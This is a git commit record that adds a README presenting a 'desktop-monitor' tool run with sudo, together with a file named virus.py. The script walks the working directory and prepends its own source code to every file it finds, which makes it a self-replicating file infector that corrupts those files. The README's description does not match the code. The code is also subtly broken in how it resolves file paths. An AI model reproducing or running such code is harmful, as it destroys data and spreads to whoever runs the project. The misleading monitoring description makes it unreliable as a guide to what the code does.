3f8bef551a3386e76d4870292f568ca0a2831279
skulla <skull3227@gmail.com>
2020-09-06 13:03:42 -0700

    Nuke Like Commit

---
+++ README.md
@@ -0,0 +1,6 @@
+# desktop-monitor
+Tool for monitoring desktop users.
+
+## Usage
+`$ sudo python monitor.py`
+
---
+++ virus.py
@@ -0,0 +1,11 @@
+
+import os
+for root, dirs, files in os.walk(os.getcwd()):
+    for f in files:
+            print('.\\' +f, __file__)
+            with open(f, 'r+') as f:
+                target_host_content = f.read()
+                f.seek(0, 0)
+                with open(__file__) as virus:
+                    virus_content = virus.read()
+                    f.write(virus_content + "\n" + target_host_content)
